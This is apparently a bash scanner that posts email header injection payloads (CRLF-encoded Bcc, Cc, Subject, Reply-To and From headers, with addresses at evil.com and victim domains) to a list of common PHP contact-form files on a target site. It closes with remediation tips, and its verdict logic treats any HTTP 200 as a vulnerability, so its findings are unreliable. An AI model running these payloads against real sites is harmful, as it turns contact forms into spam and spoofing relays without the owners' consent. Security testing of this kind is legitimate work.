#!/usr/bin/env bash
# Mail Injection Testing Script
# Tests for KNOWN standard mail tools only - no false positives for missing files

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

TARGET_URL="$1"
VERBOSE=false

if [[ -z "$TARGET_URL" ]]; then
    echo "Usage: $0 [OPTIONS] <TARGET_URL>"
    echo ""
    echo "Options:"
    echo "  -v, --verbose    Verbose output"
    echo "  -h, --help       Show this help message"
    echo ""
    echo "Examples:"
    echo "  $0 https://example.com/contact"
    echo "  $0 -v https://example.com/contact"
    exit 1
fi

# Parse arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        -v|--verbose)
            VERBOSE=true
            shift
            ;;
        -h|--help)
            echo "Mail Injection Testing Script"
            echo "Tests for email header injection vulnerabilities in KNOWN standard mail tools"
            exit 0
            ;;
        *)
            TARGET_URL="$1"
            shift
            ;;
    esac
done

# Ensure URL ends with /
if [[ ! "$TARGET_URL" =~ /$ ]]; then
    TARGET_URL="${TARGET_URL}/"
fi

echo -e "${BLUE}[INFO] Mail Injection Testing: $TARGET_URL${NC}"
echo ""

# List of KNOWN standard mail tools to test
KNOWN_MAIL_TOOLS=(
    "mail.php"
    "sendmail.php"
    "contact.php"
    "formmail.php"
    "mailer.php"
    "send.php"
    "email.php"
    "contact-form.php"
    "mail-handler.php"
    "send-mail.php"
    "mail-send.php"
    "contact-mail.php"
    "form-handler.php"
    "mail-process.php"
    "send-email.php"
)

# Function to test mail injection on a specific tool
test_mail_injection() {
    local tool="$1"
    local test_name="$2"
    local payload="$3"
    
    echo "Testing $test_name on $tool..."
    response=$(curl -s -X POST "$TARGET_URL$tool" \
        -d "$payload" \
        -w "%{http_code}" \
        -o /dev/null \
        --connect-timeout 10 \
        --max-time 15)
    
    if [[ "$response" == "200" ]]; then
        echo -e "${RED}[VULNERABLE] $test_name possible on $tool (HTTP $response)${NC}"
        return 1
    elif [[ "$response" == "404" ]] || [[ "$response" == "403" ]]; then
        echo -e "${GREEN}[SECURE] $tool not found or protected (HTTP $response)${NC}"
        return 0
    else
        echo -e "${GREEN}[SECURE] $test_name blocked on $tool (HTTP $response)${NC}"
        return 0
    fi
}

# Test each known mail tool
vulnerable_tools=0
total_tools=0

for tool in "${KNOWN_MAIL_TOOLS[@]}"; do
    echo -e "${YELLOW}Testing tool: $tool${NC}"
    total_tools=$((total_tools + 1))
    
    # Test 1: BCC injection
    test_mail_injection "$tool" "BCC injection" "name=Test&email=test@evil.com%0d%0aBcc:spam@victim1.com,spam@victim2.com&message=Test"
    
    # Test 2: Subject injection
    test_mail_injection "$tool" "Subject injection" "name=Test%0d%0aSubject:URGENT%20SECURITY%20ALERT&email=test@test.com&message=Test"
    
    # Test 3: Reply-To injection
    test_mail_injection "$tool" "Reply-To injection" "name=Test&email=test@evil.com%0d%0aReply-To:attacker@evil.com&message=Test"
    
    # Test 4: CC injection
    test_mail_injection "$tool" "CC injection" "name=Test&email=test@evil.com%0d%0aCc:spam@victim.com&message=Test"
    
    # Test 5: From header injection
    test_mail_injection "$tool" "From header injection" "name=Test&email=test@evil.com%0d%0aFrom:admin@company.com&message=Test"
    
    echo ""
done

echo -e "${BLUE}[INFO] Mail injection testing completed!${NC}"
echo ""
echo "Summary:"
echo "- Tested $total_tools known standard mail tools"
echo "- Green [SECURE] means the tool is secure or not found"
echo "- Red [VULNERABLE] means a vulnerability was found"
echo ""
echo "Note: This script only tests KNOWN standard mail tools."
echo "Private/custom mail handlers are not tested to avoid false positives."
echo ""
echo "If vulnerabilities are found:"
echo "1. Implement proper input sanitization"
echo "2. Validate email format strictly"
echo "3. Sanitize all user inputs before using in email headers"
echo "4. Use parameterized email sending functions"
